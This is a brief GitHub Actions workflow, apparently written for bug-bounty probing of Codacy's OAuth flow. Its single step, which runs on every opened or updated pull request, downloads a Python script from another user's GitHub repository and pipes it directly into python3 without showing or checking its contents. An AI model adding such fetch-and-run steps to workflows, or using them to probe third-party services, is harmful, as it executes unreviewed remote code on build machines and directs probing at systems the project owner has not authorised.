name: Codacy H1 bounded auth checks

on:
  pull_request:
    types: [opened, synchronize]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    steps:
      - name: Inspect Codacy OAuth initiation without following provider redirect
        run: curl -fsSL https://raw.githubusercontent.com/Vincx12/Potasse/8ae3599ea33fb512e102ee372f2dda4c9ee4bffa/.github/scripts/codacy_oauth_probe.py | python3
